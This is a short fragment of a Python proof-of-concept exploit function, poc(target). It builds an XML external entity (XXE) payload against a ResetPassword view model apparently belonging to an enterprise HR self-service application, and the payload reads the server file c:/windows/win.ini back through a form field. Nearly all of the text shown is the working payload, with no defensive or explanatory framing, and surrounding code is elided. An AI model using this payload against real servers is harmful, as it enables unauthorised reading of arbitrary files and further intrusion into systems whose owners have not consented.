...
def poc(target):
    ...
    data = {"__type": "updateData",
            "__viewInstanceId": "nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel",
            "__xml": "<!DOCTYPE z [<!ENTITY test  SYSTEM \"file:///c:/windows/win.ini\" >]><rpc transaction=\"1\" method=\"resetPwd\"><def><dataset type=\"Custom\" id=\"dsResetPwd\"><f name=\"user\"></f></dataset></def><data><rs dataset=\"dsResetPwd\"><r id=\"1\" state=\"insert\"><n><v>1</v></n></r></rs></data><vps><p name=\"__profileKeys\">&test;</p></vps></rpc>\r\n\r\n"}
